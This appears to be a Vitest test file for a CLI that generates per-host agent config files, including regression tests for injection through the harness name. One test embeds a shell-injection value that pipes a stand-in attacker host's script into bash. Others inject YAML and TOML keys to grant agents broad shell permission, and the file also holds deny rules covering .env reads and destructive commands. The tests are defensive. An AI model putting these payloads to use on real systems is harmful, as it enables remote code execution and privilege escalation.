// SPDX-License-Identifier: MIT
//
// ADR-045 — the CLI scaffold now emits each non-claude host's native config.

import { describe, it, expect } from 'vitest';
import { mkdtempSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFileSync } from 'node:child_process';
import { hostConfigFiles } from '../src/host-config.js';
import { scaffold } from '../src/index.js';

const base = { name: 'demo-bot', description: 'A demo harness.', mcp: 'local' as const };

describe('hostConfigFiles (ADR-045)', () => {
  it('claude-code emits nothing (templates own the .claude/ tree)', () => {
    expect(hostConfigFiles('claude-code', base)).toEqual([]);
  });

  it('opencode emits opencode.json with policy-derived permissions', () => {
    const files = hostConfigFiles('opencode', base);
    const cfg = files.find((f) => f.path === '.opencode/opencode.json')!;
    const json = JSON.parse(cfg.content);
    // ADR-046 — verified real-opencode schema: direct mcp map + top-level permission.
    expect(json.mcp['demo-bot'].type).toBe('local');
    expect(json.mcp['demo-bot'].enabled).toBe(true);
    expect(json.permission.bash['rm *']).toBe('deny');
    expect(json.permission.edit).toBe('ask');
  });

  it('codex emits config.toml + AGENTS.md', () => {
    const paths = hostConfigFiles('codex', base).map((f) => f.path);
    expect(paths).toContain('.codex/config.toml');
    expect(paths).toContain('AGENTS.md');
  });

  it('rvm emits a non-empty capability table', () => {
    const caps = JSON.parse(hostConfigFiles('rvm', base).find((f) => f.path === 'capability-table.json')!.content);
    expect(caps.length).toBeGreaterThan(0);
    expect(caps[0].rights).toContain('EXECUTE');
  });

  it('github-actions workflow env is provider-agnostic', () => {
    const wf = hostConfigFiles('github-actions', base).find((f) => f.path.startsWith('.github/workflows/'))!;
    expect(wf.content).toContain('OPENROUTER_API_KEY:');
    expect(wf.content).toContain('ANTHROPIC_API_KEY:');
  });

  it('hermes emits a personality keyed by the harness name', () => {
    const cfg = hostConfigFiles('hermes', base).find((f) => f.path === 'cli-config.yaml')!;
    expect(cfg.content).toContain('demo-bot: "A demo harness."');
  });

  // Regression: `cfg.name` lands in YAML *key* position
  // (`agent.personalities.<name>`) and is unconstrained at this type's
  // level — a name containing `:` previously produced two top-level `:` on
  // one line (corrupted YAML). Kept in lockstep with
  // @metaharness/host-hermes's own yamlKey() fix and the web-ui generator's
  // copy (ADR-027 byte-for-byte parity).
  it('hermes escapes a harness name containing YAML-significant characters as a mapping key', () => {
    const cfg = hostConfigFiles('hermes', { ...base, name: 'evil: name' }).find((f) => f.path === 'cli-config.yaml')!;
    expect(cfg.content).toContain('"evil: name": "A demo harness."');
    expect(cfg.content).not.toMatch(/^ {4}evil: name:/m);
  });

  // Regression: `cfg.name` also lands unescaped inside a *double-quoted bash
  // string* in the github-actions composite action's `run:` line — a name
  // containing `"` + shell metacharacters previously broke out of the
  // `echo` string and injected an arbitrary second shell command into the
  // generated action.yml. Same root cause and same fix shape (shellDq(),
  // kept in lockstep with the web-ui generator's copy and the real
  // @metaharness/host-github-actions adapter's copy — ADR-027 parity) as
  // the hermes yamlKey() fix above.
  //
  // Verifies actual bash execution, not just string content: an adversarial
  // review of the first draft of this fix found that checking for an
  // escaped `"` in the line wasn't enough proof of safety — a plain
  // `run: echo "..."` YAML *scalar* line still lets a name containing ` #`
  // truncate the line as a YAML comment before bash ever sees it (silently
  // producing a broken action.yml, not RCE, but not "safe" either). The
  // fix moved to a `|` block literal, where `#`/`:` are inert; this test
  // extracts the literal block body and actually runs it through bash.
  it('github-actions neutralizes a harness name containing shell metacharacters in the composite action run: line', () => {
    const evil = 'harness"; curl -s http://attacker.example/x | bash #';
    const action = hostConfigFiles('github-actions', { ...base, name: evil })
      .find((f) => f.path.endsWith('/action.yml'))!;
    expect(action.content).toContain('run: |\n'); // block literal, not a plain scalar
    const body = action.content.split('run: |\n')[1]!.split('\n')[0]!.trim();
    const out = execFileSync('bash', ['-c', body], { encoding: 'utf-8' });
    // If the payload had broken out, `curl`'s (network-failure) stderr or a
    // 2nd echo's output would appear; the whole malicious string must come
    // back as inert, single-line echo output instead.
    expect(out.trim()).toBe('Running harness"; curl -s http://attacker.example/x | bash # (non-interactive)…');
  });

  // Regression: `cfg.name` also lands unescaped in the workflow.yml header
  // *comment* (`# GitHub Actions harness: ${cfg.name}`) — a name containing
  // a newline breaks out of the comment and injects an arbitrary top-level
  // YAML key into the document (found by the same adversarial review pass
  // that caught the run: line gap above — same root cause, comment
  // position instead of bash-string position).
  it('github-actions strips newlines from a harness name in the workflow.yml header comment', () => {
    const evil = 'evil-harness\nrun-name: pwned-by-attacker\n#';
    const wf = hostConfigFiles('github-actions', { ...base, name: evil })
      .find((f) => f.path.startsWith('.github/workflows/'))!;
    expect(wf.content.split('\n')[0]).toBe('# GitHub Actions harness: evil-harness run-name: pwned-by-attacker #');
    expect(wf.content).not.toMatch(/^run-name:/m);
  });

  it('pi-dev emits trust.json + copilot emits copilot-instructions.md', () => {
    expect(hostConfigFiles('pi-dev', base).map((f) => f.path)).toContain('trust.json');
    expect(hostConfigFiles('copilot', base).map((f) => f.path)).toContain('.github/copilot-instructions.md');
  });

  it('allowShell opens opencode bash wildcard to "allow"', () => {
    const json = JSON.parse(hostConfigFiles('opencode', { ...base, allowShell: true }).find((f) => f.path === '.opencode/opencode.json')!.content);
    expect(json.permission.bash['*']).toBe('allow');
  });

  it('unknown host id emits nothing (no throw)', () => {
    expect(hostConfigFiles('does-not-exist', base)).toEqual([]);
  });

  // ADR-280 — Grok Build CLI.
  it('grok emits .grok/config.toml ([mcp_servers] + [permission]), AGENTS.md and install-grok.md', () => {
    const files = hostConfigFiles('grok', base);
    expect(files.map((f) => f.path)).toEqual(['.grok/config.toml', 'AGENTS.md', 'install-grok.md']);
    const toml = files[0]!.content;
    expect(toml).toBe([
      '# demo-bot — Grok Build project config (metaharness host: grok, ADR-280).',
      '# Grok starts these servers and applies these rules only in a trusted folder; see install-grok.md.',
      '',
      '[mcp_servers.demo-bot]',
      'command = "npx"',
      'args = ["-y", "demo-bot@latest", "mcp", "start"]',
      'enabled = true',
      '',
      '[permission]',
      'allow = [',
      '  "mcp__demo-bot__*",',
      ']',
      'deny = [',
      '  "Read(./.env)",',
      '  "Read(./.env.*)",',
      '  "Bash(rm:*)",',
      '  "Bash(git push:*)",',
      '  "Write(*)",',
      '  "Edit(*)",',
      ']',
      '',
    ].join('\n'));
    expect(files[1]!.content).toContain('`demo-bot__*` in Grok');
  });

  it('grok remote MCP is url + headers with no `type` key (unlike the codex arm)', () => {
    const toml = hostConfigFiles('grok', { ...base, mcp: 'remote' })[0]!.content;
    expect(toml).toContain('[mcp_servers.demo-bot]\nurl = "https://localhost:8787/mcp"\nenabled = true\n\n[mcp_servers.demo-bot.headers]\nAuthorization = "Bearer ${HARNESS_MCP_TOKEN}"');
    expect(toml).not.toMatch(/^type =/m);
  });

  it('grok runbook leads with the trust step and repeats every deny rule as a --deny flag', () => {
    const md = hostConfigFiles('grok', base).find((f) => f.path === 'install-grok.md')!.content;
    expect(md.indexOf('ACTION REQUIRED')).toBeLessThan(md.indexOf('1. Install'));
    expect(md).toContain('grok --trust inspect');
    expect(md).toContain("--deny 'Read(./.env)' --deny 'Read(./.env.*)' --deny 'Bash(rm:*)' --deny 'Bash(git push:*)' --deny 'Write(*)' --deny 'Edit(*)'");
    expect(md).toContain('`7 loaded` permissions');
  });

  // Same bug class as the hermes/github-actions regressions above: `cfg.name`
  // is unconstrained at this type's level and lands in a TOML table header
  // and comment. It must not inject a table (validateHarnessName blocks it on
  // the CLI path; this module must not rely on that).
  it('grok: an adversarial harness name cannot inject TOML structure', () => {
    const evil = 'evil]\n[permission]\nallow = ["Bash(*)"]\n#';
    const toml = hostConfigFiles('grok', { ...base, name: evil })[0]!.content;
    expect(toml.split('\n')[0]).toBe('# evil] [permission] allow = ["Bash(*)"] # — Grok Build project config (metaharness host: grok, ADR-280).');
    expect(toml.match(/^\[permission\]$/gm)).toHaveLength(1);
    expect(toml).toContain('[mcp_servers.evil-permission-allow-Bash]');
    let hasTomllib = true;
    try { execFileSync('python3', ['-c', 'import tomllib'], { stdio: 'ignore' }); } catch { hasTomllib = false; }
    if (hasTomllib) {
      const parsed = JSON.parse(execFileSync('python3', ['-c', 'import json,sys,tomllib; print(json.dumps(tomllib.loads(sys.stdin.read())))'], { input: toml, encoding: 'utf-8' }));
      expect(Object.keys(parsed.mcp_servers)).toEqual(['evil-permission-allow-Bash']);
      expect(parsed.permission.allow).toEqual([`mcp__${evil}__*`]);
    }
  });
});

describe('scaffold wires host config (ADR-045 end-to-end)', () => {
  it('--host opencode writes .opencode/opencode.json to disk', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mh-adr045-'));
    await scaffold({
      name: 'oc-bot', template: 'minimal', host: 'opencode' as never,
      description: 'x', targetDir: dir, force: true, generatorVersion: '0.0.0-test',
    });
    expect(existsSync(join(dir, '.opencode/opencode.json'))).toBe(true);
    const json = JSON.parse(readFileSync(join(dir, '.opencode/opencode.json'), 'utf-8'));
    expect(json.permission.bash['rm *']).toBe('deny');
  });

  it('host files are recorded in the manifest fingerprints', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mh-adr045-'));
    await scaffold({
      name: 'gh-bot', template: 'minimal', host: 'github-actions' as never,
      description: 'x', targetDir: dir, force: true, generatorVersion: '0.0.0-test',
    });
    const manifest = JSON.parse(readFileSync(join(dir, '.harness/manifest.json'), 'utf-8'));
    const files = Object.keys(manifest.files);
    expect(files.some((p) => p.startsWith('.github/workflows/'))).toBe(true);
  });

  // GH #10 — a single scaffold produces a multi-host harness.
  it('emits config + dep + manifest entry for every host (multi-host)', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mh-multi-'));
    await scaffold({
      name: 'multi', template: 'minimal',
      host: 'claude-code' as never, hosts: ['claude-code', 'codex', 'opencode'] as never,
      description: 'x', targetDir: dir, force: true, generatorVersion: '0.0.0-test',
    });
    expect(existsSync(join(dir, '.codex/config.toml'))).toBe(true);
    expect(existsSync(join(dir, '.opencode/opencode.json'))).toBe(true);
    const manifest = JSON.parse(readFileSync(join(dir, '.harness/manifest.json'), 'utf-8'));
    expect(manifest.hosts).toEqual(['claude-code', 'codex', 'opencode']);
    const deps = JSON.parse(readFileSync(join(dir, 'package.json'), 'utf-8')).dependencies;
    expect(deps['@metaharness/host-codex']).toBeDefined();
    expect(deps['@metaharness/host-opencode']).toBeDefined();
  });

  // GH #11 — non-Claude host doesn't get Claude-Code-specific runtime files.
  it('omits .claude/settings.json + .claude-plugin when claude-code is not selected', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mh-gate-'));
    await scaffold({
      name: 'rvm-only', template: 'minimal', host: 'rvm' as never, hosts: ['rvm'] as never,
      description: 'x', targetDir: dir, force: true, generatorVersion: '0.0.0-test',
    });
    expect(existsSync(join(dir, '.claude/settings.json'))).toBe(false);
    expect(existsSync(join(dir, '.claude-plugin'))).toBe(false);
    expect(existsSync(join(dir, 'rvm.manifest.toml'))).toBe(true);
  });

  // ADR-280 — --host grok end to end, alone and alongside claude-code.
  it('--host grok writes .grok/config.toml + AGENTS.md + install-grok.md, fingerprinted, no Claude runtime config', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mh-grok-'));
    await scaffold({
      name: 'grok-bot', template: 'minimal', host: 'grok' as never, hosts: ['grok'] as never,
      description: 'x', targetDir: dir, force: true, generatorVersion: '0.0.0-test',
    });
    for (const f of ['.grok/config.toml', 'AGENTS.md', 'install-grok.md']) expect(existsSync(join(dir, f)), f).toBe(true);
    expect(existsSync(join(dir, '.claude/settings.json'))).toBe(false);
    const manifest = JSON.parse(readFileSync(join(dir, '.harness/manifest.json'), 'utf-8'));
    expect(manifest.hosts).toEqual(['grok']);
    expect(Object.keys(manifest.files)).toEqual(expect.arrayContaining(['.grok/config.toml', 'AGENTS.md', 'install-grok.md']));
    const deps = JSON.parse(readFileSync(join(dir, 'package.json'), 'utf-8')).dependencies;
    expect(deps['@metaharness/host-grok']).toBeDefined();
  });

  it('claude-code + grok multi-host keeps both trees and both host deps', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mh-grok-multi-'));
    await scaffold({
      name: 'both', template: 'minimal', host: 'claude-code' as never, hosts: ['claude-code', 'grok'] as never,
      description: 'x', targetDir: dir, force: true, generatorVersion: '0.0.0-test',
    });
    expect(existsSync(join(dir, '.claude/settings.json'))).toBe(true);
    expect(existsSync(join(dir, '.grok/config.toml'))).toBe(true);
    const deps = JSON.parse(readFileSync(join(dir, 'package.json'), 'utf-8')).dependencies;
    expect(deps['@metaharness/host-claude-code']).toBeDefined();
    expect(deps['@metaharness/host-grok']).toBeDefined();
  });

  it('keeps .claude/settings.json when claude-code IS among the hosts', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mh-keep-'));
    await scaffold({
      name: 'cc', template: 'minimal', host: 'claude-code' as never, hosts: ['claude-code', 'rvm'] as never,
      description: 'x', targetDir: dir, force: true, generatorVersion: '0.0.0-test',
    });
    expect(existsSync(join(dir, '.claude/settings.json'))).toBe(true);
    expect(existsSync(join(dir, 'rvm.manifest.toml'))).toBe(true);
  });
});
